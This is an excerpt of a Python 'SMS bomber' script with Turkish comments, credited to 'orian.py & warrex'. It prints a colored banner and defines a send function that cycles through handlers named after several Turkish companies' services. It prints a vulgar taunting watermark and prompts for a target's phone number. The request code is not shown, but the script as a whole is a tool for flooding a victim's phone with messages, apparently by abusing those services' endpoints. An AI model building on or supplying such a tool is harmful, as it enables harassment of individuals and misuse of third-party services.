...
# Yazdırılacak metin ve renkler
metin = "ORİAN.PY & WARREX SMS BOMBER "
renkler = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]

# Harfleri tek tek yazdırma
for i, harf in enumerate(metin):
    renk = renkler[i % len(renkler)]  # Her harfe sırayla farklı renk uygula
    sys.stdout.write(renk + harf + Style.RESET_ALL)  # Harfi renkli yazdır
    sys.stdout.flush()  # Anında ekrana bas
    time.sleep(0.2)  # 0.2 saniye bekle

print()  # Yazı bittikten sonra bir satır atla
try:
...
def send(number, amount, worker_amount):
    ...
    functions = [anadolu, bim, file, gez, gofody, kimgbister, tazi, tiklagelsin, weescooter]
...
def watermark():
   G = '\033[1;35m'
   print(G+'           Hayatta lafı olanı sanalda sikerler...')

def get_number():
    global clear
    while True:
        try:
            number = int(input(f"""Telefon numarasını yazın. Bunun gibi: "54xxxxxxxx" orian.py &  warrex)\n[?] : """))
